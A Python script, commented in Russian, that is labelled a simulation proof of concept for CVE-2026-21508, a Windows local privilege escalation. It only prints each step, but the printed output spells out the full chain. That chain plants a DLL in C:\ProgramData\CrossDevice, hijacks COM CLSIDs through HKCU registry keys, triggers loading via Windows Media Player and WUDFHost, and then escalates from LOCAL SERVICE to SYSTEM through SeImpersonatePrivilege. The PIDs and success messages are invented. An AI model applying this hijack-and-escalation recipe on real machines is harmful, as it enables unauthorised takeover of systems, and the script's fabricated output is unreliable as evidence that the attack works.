#!/usr/bin/env python3
"""
CVE-2026-21508 - Windows Storage LPE PoC (имитация)
Автор: 0xc4r
"""

import os
import sys
import ctypes
import platform
import time

class Colors:
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class CVE202621508PoC:
    def __init__(self, usb_path):
        self.usb_path = usb_path.rstrip('\\') + '\\'
        self.first_clsid = "{F5FB2C77-0E2F-4A16-A381-3E560C68BC83}"
        self.target_clsid = "{E9F83CF2-E0C0-4CA7-AF01-E90C70BEF496}"
        self.dll_dest_path = "C:\\ProgramData\\CrossDevice\\CrossDevice.Streaming.Source.dll"
        self.usb_image = "alps.jpg"
        self.wmp_path = "C:\\Program Files (x86)\\Windows Media Player\\wmplayer.exe"
        self.instance_key = f"HKCU\\Software\\Classes\\CLSID\\{self.first_clsid}\\Instance"
        self.shellfolder_key = f"HKCU\\Software\\Classes\\CLSID\\{self.target_clsid}\\ShellFolder"

    def run(self):
        print(f"{Colors.BOLD}{Colors.CYAN}====================================={Colors.END}")
        print(f"{Colors.BOLD}{Colors.YELLOW}CVE-2026-21508 PoC{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}====================================={Colors.END}")
        print(f"{Colors.YELLOW}[!] РЕЖИМ: ИМИТАЦИЯ{Colors.END}\n")

        print(f"{Colors.BLUE}[1] USB подготовка{Colors.END}")
        print(f"    copy {self.usb_image} {self.usb_path}")
        print(f"    {Colors.GREEN}[OK]{Colors.END}\n")

        print(f"{Colors.BLUE}[2] DLL развертывание{Colors.END}")
        print(f"    mkdir {self.dll_dest_path.rsplit('\\',1)[0]}")
        print(f"    copy Session0_CMD.dll {self.dll_dest_path}")
        print(f"    {Colors.GREEN}[OK]{Colors.END}\n")

        print(f"{Colors.BLUE}[3] Реестр{Colors.END}")
        print(f"    reg add {self.instance_key} /V CLSID /D {self.target_clsid} /f")
        print(f"    reg add {self.shellfolder_key} /f")
        print(f"    {Colors.GREEN}[OK]{Colors.END}\n")

        print(f"{Colors.BLUE}[4] Триггер{Colors.END}")
        print(f"    timeout 2")
        print(f"    start {self.wmp_path}")
        print(f"    {Colors.GREEN}[OK]{Colors.END}\n")

        print(f"{Colors.BLUE}[5] WUDFHost.exe{Colors.END}")
        print(f"    PID: 1234 | LOCAL SERVICE")
        print(f"    _SHCoCreateInstance({self.first_clsid})")
        print(f"    → Чтение CLSID: {self.target_clsid}")
        print(f"    → Загрузка: {self.dll_dest_path}")
        print(f"    {Colors.GREEN}[OK]{Colors.END}\n")

        print(f"{Colors.BLUE}[6] DllMain{Colors.END}")
        print(f"    RevertToSelf()")
        print(f"    CreateProcess(cmd.exe)")
        print(f"    PID: 5678 | PPID: 1234 | LOCAL SERVICE")
        print(f"    {Colors.GREEN}[OK]{Colors.END}\n")

        print(f"{Colors.BLUE}[7] SYSTEM эскалация{Colors.END}")
        print(f"    SeImpersonatePrivilege")
        print(f"    CreateProcessAsUser(cmd.exe)")
        print(f"    PID: 7890 | SYSTEM")
        print(f"    {Colors.GREEN}[OK]{Colors.END}\n")

        print(f"{Colors.BOLD}{Colors.CYAN}====================================={Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}[+] Атака эмулирована{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}====================================={Colors.END}")

def main():
    if len(sys.argv) != 2:
        usb_path = input("USB path [F:\\]: ") or "F:\\"
    else:
        usb_path = sys.argv[1]
    
    CVE202621508PoC(usb_path).run()

if __name__ == "__main__":
    main()
